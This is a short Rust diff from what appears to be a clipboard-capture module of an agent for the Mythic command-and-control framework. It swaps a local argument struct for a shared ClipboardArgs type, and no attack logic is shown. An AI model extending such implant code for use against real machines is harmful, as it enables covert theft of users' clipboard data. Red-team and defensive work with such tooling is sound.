@@ -2,7 +2,7 @@ use std::ptr;
 use std::thread;
 use std::time::Duration;
 use serde::{Deserialize, Serialize};
-use crate::AgentTask;
+use crate::{AgentTask, ClipboardArgs};
 
 #[cfg(target_os = "windows")]
 use winapi::um::winuser::*;
@@ -14,10 +14,6 @@ use winapi::ctypes::c_void;
 use std::ffi::OsString;
 #[cfg(target_os = "windows")]
 use std::os::windows::ffi::OsStringExt;
-
-// Command structure for Mythic
-#[derive(Serialize, Deserialize)]
-pub struct GetClipboardArgs {}
 
 #[cfg(target_os = "windows")]
 const CF_UNICODETEXT: u32 = 13;
